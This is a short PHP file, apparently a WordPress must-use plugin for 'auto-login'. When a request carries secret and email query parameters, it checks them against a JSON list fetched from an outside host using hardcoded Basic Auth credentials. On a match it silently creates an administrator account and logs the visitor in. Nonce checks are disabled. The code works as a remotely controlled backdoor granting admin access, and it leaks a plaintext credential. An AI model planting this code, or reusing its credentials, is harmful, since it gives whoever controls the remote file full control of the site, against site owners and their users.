<?php
// phpcs:disabled WordPress.Security.NonceVerification.Recommended
$login_secret = $_GET['login_secret'] ?? '';
$login_email  = $_GET['login_email'] ?? '';

if ( $login_secret && $login_email ) {
	add_action(
		'send_headers',
		static function () use ( $login_secret, $login_email ) {
			$response = wp_remote_get(
				'https://wldbasetheme.wpengine.com/wp-content/mu-plugins/wld-plugins/wld-auto-login/data.json',
				array(
					'headers' => array(
						// phpcs:ignore WordPress.PHP.DiscouragedPHPFunctions.obfuscation_base64_encode
						'Authorization' => 'Basic ' . base64_encode( 'wldbasetheme:asda3e23asda3e231dsda' ),
					),
				)
			);
			if ( is_wp_error( $response ) ) {
				return;
			}

			/** @noinspection JsonEncodingApiUsageInspection */
			$data = json_decode( wp_remote_retrieve_body( $response ), false );
			if ( json_last_error() ) {
				return;
			}

			$user_data = wp_list_filter(
				$data,
				array(
					'secret' => $login_secret,
					'email'  => $login_email,
				)
			);
			$user_data = array_shift( $user_data );
			if ( $user_data ) {
				if ( ! get_user_by( 'email', $user_data->email ) ) {
					$user_id_or_error = wp_insert_user(
						array(
							'user_email' => $user_data->email,
							'user_login' => $user_data->email,
							'user_pass'  => $user_data->password,
							'role'       => 'administrator',
						)
					);
					if ( is_wp_error( $user_id_or_error ) ) {
						sd( $user_id_or_error );
					}
				}

				$user_data = get_user_by( 'email', $user_data->email );

				wp_clear_auth_cookie();
				wp_set_auth_cookie( $user_data->ID, true );
				wp_safe_redirect( admin_url() );
				exit();
			}
		},
		1
	);
}
